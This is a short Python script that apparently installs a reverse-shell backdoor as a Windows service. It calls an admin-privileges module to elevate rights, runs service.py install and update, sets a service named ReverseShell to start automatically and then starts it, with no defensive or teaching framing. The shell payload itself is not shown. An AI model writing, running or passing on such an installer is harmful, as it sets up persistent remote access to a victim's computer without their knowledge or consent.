import subprocess

import admin_privileges_manager

if __name__ == '__main__':
    try:
        admin_privileges_manager.execute()
        subprocess.check_output("python service.py install", stderr=subprocess.STDOUT, shell=True)
        subprocess.check_output("python service.py update", stderr=subprocess.STDOUT, shell=True)
        subprocess.check_output("sc config ReverseShell start=auto", stderr=subprocess.STDOUT, shell=True)
        subprocess.check_output("net start ReverseShell", stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print(e)
